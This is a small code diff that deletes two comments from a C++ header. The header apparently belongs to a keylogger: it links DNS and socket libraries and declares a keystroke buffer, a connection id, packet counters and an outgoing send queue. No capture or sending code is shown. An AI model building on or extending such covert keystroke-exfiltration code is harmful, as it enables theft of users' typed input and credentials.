@@ -9,7 +9,6 @@
 #pragma comment(lib, "Dnsapi.lib") 
 #pragma comment(lib, "Ws2_32.lib")
 
-// Buffer size for keystrokes before sending
 #define MAX_BUFFER 10
 
 // Global variables
@@ -21,7 +20,6 @@ inline std::string keystrokeBuffer   = "";
 inline int         connectionId      = -1;
 inline int         packetNumber      = 0;
 
-// Async sending queue
 inline std::queue<std::string> sendQueue;
 inline std::mutex queueMutex;
 inline bool shouldStopSender = false;
